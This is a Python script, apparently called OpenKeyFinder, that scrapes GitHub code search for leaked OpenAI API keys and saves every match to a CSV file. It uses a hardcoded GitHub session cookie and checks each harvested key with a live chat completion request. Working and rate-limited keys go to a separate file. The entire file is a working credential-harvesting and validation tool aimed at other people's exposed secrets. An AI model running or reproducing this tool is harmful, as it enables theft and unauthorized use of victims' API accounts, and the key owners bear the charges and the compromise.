import requests
import re
import openai
import csv
import time
from collections import defaultdict

GITHUB_COOKIE_SESSION = "hpzzHWIjslEyNCTMNgIJfmY3JIK2nMAv_XoW1xlrEWRZxekK"  # Replace with your GitHub session cookie

print(r"""
\033[94m 
   ____                   _  __          ______ _           _           
  / __ \                 | |/ /         |  ____(_)         | |          
 | |  | |_ __   ___ _ __ | ' / ___ _   _| |__   _ _ __   __| | ___ _ __ 
 | |  | | '_ \ / _ \ '_ \|  < / _ \ | | |  __| | | '_ \ / _` |/ _ \ '__|
 | |__| | |_) |  __/ | | | . \  __/ |_| | |    | | | | | (_| |  __/ |   
  \____/| .__/ \___|_| |_|_|\_\___|\__, |_|    |_|_| |_|\__,_|\___|_|   
        | |                         __/ |                               
        |_|                        |___/                                    
                                                       twitter: @hck4fun\033[00m
                                """)

# Regex to match OpenAI API keys (assuming the T3BlbkFJ part is always present)
regex = r"sk-[a-zA-Z0-9]*T3BlbkFJ[a-zA-Z0-9]*"

cookies = {'user_session': GITHUB_COOKIE_SESSION}
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0',
    'Accept': 'application/json',
}

matches = []
# Search through the first 5 pages of GitHub code results
for i in range(1, 6):
    params = {'q': f'/{regex}/', 'type': 'code', 'p': i}
    response = requests.get('https://github.com/search', params=params, cookies=cookies, headers=headers)
    found_keys = re.findall(regex, response.text)
    matches.extend(found_keys)

# Read existing keys from CSV
existing_keys = set()
try:
    with open('keys.csv', 'r', newline='') as csvfile:
        reader = csv.reader(csvfile)
        for row in reader:
            # Skip empty rows
            if row and len(row) > 0:
                existing_keys.add(row[0])
except FileNotFoundError:
    pass

# Write new keys to CSV if they are not duplicates
new_keys = [m for m in matches if m not in existing_keys]
if new_keys:
    with open('keys.csv', 'a', newline='') as csvfile:
        writer = csv.writer(csvfile)
        for key in new_keys:
            writer.writerow([key])
            existing_keys.add(key)

print(f"FOUND:\033[95m {len(matches)} keys\033[00m")

# Combine all keys for validation
all_keys = list(existing_keys.union(matches))

# Validate keys and track working/non-working keys
keys = defaultdict(list)
keys['working'] = []
keys['not_working'] = []

print("Checking API KEYS....")
start_time = time.time()

for match in all_keys:
    try:
        # Create a client with the current API key
        client = openai.Client(api_key=match)
        
        # Test the key by making a request
        completion = client.chat.completions.create(
            model="gpt-3.5-turbo",
            messages=[{"role": "user", "content": "Hello, world!"}],
            temperature=0.6
        )
        print(f"{match}: API key is:\033[92m VALID\033[00m")
        keys['working'].append(match)
    except openai.AuthenticationError:
        print(f"{match}: API key is:\033[91m NOT VALID\033[00m")
        keys['not_working'].append(match)
    except openai.RateLimitError:
        print(f"{match}: API key:\033[93m VALID but RATE LIMITED/QUOTA EXCEEDED\033[00m")
        keys['working'].append(match)  # Consider rate-limited keys as working
    except openai.OpenAIError as e:
        print(f"{match}: API key resulted in an API error: {e}")
        keys['not_working'].append(match)
    except Exception as e:
        print(f"{match}: Unknown error occurred: {e}")
        keys['not_working'].append(match)

end_time = time.time()
time_taken = round(end_time - start_time, 2)

# Output working keys to a new CSV
if keys['working']:
    with open('working_keys.csv', 'w', newline='') as csvfile:
        writer = csv.writer(csvfile)
        for key in keys['working']:
            writer.writerow([key])

print(f"\nWorking keys: {keys['working']}")
print(f"\nTime taken: {time_taken}s")
